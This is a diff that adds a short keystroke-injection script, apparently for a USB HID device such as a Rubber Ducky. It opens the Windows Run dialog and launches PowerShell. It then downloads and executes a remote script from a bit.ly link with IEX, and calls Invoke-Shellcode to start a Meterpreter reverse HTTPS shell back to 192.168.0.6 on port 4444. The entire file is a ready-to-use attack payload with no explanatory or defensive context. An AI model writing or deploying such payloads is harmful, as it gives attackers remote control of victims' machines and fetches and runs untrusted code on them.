@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 2000
+STRING IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/pega94")
+ENTER
+DELAY 300
+STRING Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.6 -Lport 4444 -Force
+ENTER
